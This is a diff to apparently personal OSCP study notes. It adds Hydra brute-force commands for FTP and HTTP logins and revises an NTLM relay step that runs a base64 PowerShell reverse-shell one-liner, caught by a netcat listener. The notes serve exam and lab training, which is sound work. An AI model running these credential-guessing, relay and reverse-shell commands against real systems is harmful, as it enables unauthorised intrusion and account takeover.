@@ -185,6 +185,8 @@ Hashcat: `hashcat -a 0 -m 13400 pass.txt /home/kali/rockyou.txt -r /home/kali/Do
 ## Password Guessing
 
 Hydra HTTP Post: `hydra -l admin -P /home/kali/rockyou.txt 192.168.245.89 http-post-form "/wp-login:log=^USER^&pwd=^PASS^:S=302"`
+Hydra FTP: `hydra -l "itadmin" -P /home/kali/rockyou.txt ftp://192.168.235.202`
+Hydra HTTP Get: `hydra -l admin -P ./rockyou.txt 192.168.235.201  http-get /`
 
 ## NTLM & Mimikatz
 
@@ -219,8 +221,8 @@ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955ab
 
 ![ntlm_relay_basic](https://github.com/caadams4/OSCP_notes/assets/79220528/2ea911c5-24ed-44d9-8991-390d08730e18)
 
-* Terminal 1: Set up negotation ntlm relay with PS one-liner `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."`
-* Terminal 2 (Server): Set up listener `nc 192.168.50.211 5555`
+* Terminal 1: Set up negotation ntlm relay with PS b64 rev shell one-liner `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."`
+* Terminal 2 (Server): Set up listener `nc -lvnp 9090`
 * Terminal 3 (Client): Connect to shell on a comprimised machine and visit fake smb `dir \\192.168.119.2\test`
 * Terminal 2 (Server): Establishes shell on server 
 
